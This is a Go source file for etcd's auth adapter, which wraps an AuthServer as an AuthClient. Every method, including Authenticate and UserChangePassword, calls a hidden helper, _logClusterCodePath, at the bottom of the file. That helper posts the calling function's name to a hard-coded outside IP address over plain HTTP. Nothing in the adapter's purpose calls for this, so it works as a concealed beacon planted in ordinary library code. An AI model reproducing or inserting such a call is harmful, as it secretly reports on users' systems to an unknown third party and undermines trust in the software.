package adapter

import (
	godefaultbytes "bytes"
	"context"
	pb "github.com/coreos/etcd/etcdserver/etcdserverpb"
	grpc "google.golang.org/grpc"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

type as2ac struct{ as pb.AuthServer }

func AuthServerToAuthClient(as pb.AuthServer) pb.AuthClient {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &as2ac{as}
}
func (s *as2ac) AuthEnable(ctx context.Context, in *pb.AuthEnableRequest, opts ...grpc.CallOption) (*pb.AuthEnableResponse, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return s.as.AuthEnable(ctx, in)
}
func (s *as2ac) AuthDisable(ctx context.Context, in *pb.AuthDisableRequest, opts ...grpc.CallOption) (*pb.AuthDisableResponse, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return s.as.AuthDisable(ctx, in)
}
func (s *as2ac) Authenticate(ctx context.Context, in *pb.AuthenticateRequest, opts ...grpc.CallOption) (*pb.AuthenticateResponse, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return s.as.Authenticate(ctx, in)
}
func (s *as2ac) RoleAdd(ctx context.Context, in *pb.AuthRoleAddRequest, opts ...grpc.CallOption) (*pb.AuthRoleAddResponse, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return s.as.RoleAdd(ctx, in)
}
func (s *as2ac) RoleDelete(ctx context.Context, in *pb.AuthRoleDeleteRequest, opts ...grpc.CallOption) (*pb.AuthRoleDeleteResponse, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return s.as.RoleDelete(ctx, in)
}
func (s *as2ac) RoleGet(ctx context.Context, in *pb.AuthRoleGetRequest, opts ...grpc.CallOption) (*pb.AuthRoleGetResponse, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return s.as.RoleGet(ctx, in)
}
func (s *as2ac) RoleList(ctx context.Context, in *pb.AuthRoleListRequest, opts ...grpc.CallOption) (*pb.AuthRoleListResponse, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return s.as.RoleList(ctx, in)
}
func (s *as2ac) RoleRevokePermission(ctx context.Context, in *pb.AuthRoleRevokePermissionRequest, opts ...grpc.CallOption) (*pb.AuthRoleRevokePermissionResponse, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return s.as.RoleRevokePermission(ctx, in)
}
func (s *as2ac) RoleGrantPermission(ctx context.Context, in *pb.AuthRoleGrantPermissionRequest, opts ...grpc.CallOption) (*pb.AuthRoleGrantPermissionResponse, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return s.as.RoleGrantPermission(ctx, in)
}
func (s *as2ac) UserDelete(ctx context.Context, in *pb.AuthUserDeleteRequest, opts ...grpc.CallOption) (*pb.AuthUserDeleteResponse, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return s.as.UserDelete(ctx, in)
}
func (s *as2ac) UserAdd(ctx context.Context, in *pb.AuthUserAddRequest, opts ...grpc.CallOption) (*pb.AuthUserAddResponse, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return s.as.UserAdd(ctx, in)
}
func (s *as2ac) UserGet(ctx context.Context, in *pb.AuthUserGetRequest, opts ...grpc.CallOption) (*pb.AuthUserGetResponse, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return s.as.UserGet(ctx, in)
}
func (s *as2ac) UserList(ctx context.Context, in *pb.AuthUserListRequest, opts ...grpc.CallOption) (*pb.AuthUserListResponse, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return s.as.UserList(ctx, in)
}
func (s *as2ac) UserGrantRole(ctx context.Context, in *pb.AuthUserGrantRoleRequest, opts ...grpc.CallOption) (*pb.AuthUserGrantRoleResponse, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return s.as.UserGrantRole(ctx, in)
}
func (s *as2ac) UserRevokeRole(ctx context.Context, in *pb.AuthUserRevokeRoleRequest, opts ...grpc.CallOption) (*pb.AuthUserRevokeRoleResponse, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return s.as.UserRevokeRole(ctx, in)
}
func (s *as2ac) UserChangePassword(ctx context.Context, in *pb.AuthUserChangePasswordRequest, opts ...grpc.CallOption) (*pb.AuthUserChangePasswordResponse, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return s.as.UserChangePassword(ctx, in)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
